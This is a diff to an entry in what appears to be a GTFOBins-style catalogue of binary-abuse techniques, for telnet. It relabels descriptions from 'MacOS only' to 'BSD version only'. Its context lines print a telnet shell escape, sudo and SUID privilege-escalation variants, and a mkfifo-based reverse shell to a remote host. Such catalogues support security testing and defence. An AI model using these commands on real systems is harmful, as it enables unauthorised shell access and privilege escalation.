@@ -1,13 +1,13 @@
 ---
 functions:
   exec-interactive:
-    - code: |
+    - description: BSD version only.
+      code: |
         RHOST=www.google.com
         RPORT=80
         telnet $RHOST $RPORT
         ^]
         !/bin/sh
-      description: MacOS only.
   reverse-shell:
     - description: Run `nc -l -p 8000` to receive the shell on the other end.
       code: |
@@ -17,19 +17,20 @@ functions:
         rm $TF
         mkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/bash 1>$TF
   sudo-enabled:
-    - code: |
+    - description: BSD version only.
+      code: |
         RHOST=www.google.com
         RPORT=80
         sudo telnet $RHOST $RPORT
         ^]
         !/bin/sh
-      description: MacOS only.
   suid-limited:
-    - code: |
+    - description: BSD version only.
+      code: |
         RHOST=www.google.com
         RPORT=80
         ./telnet $RHOST $RPORT
         ^]
         !/bin/sh
-      description: MacOS only.
+      
 ---
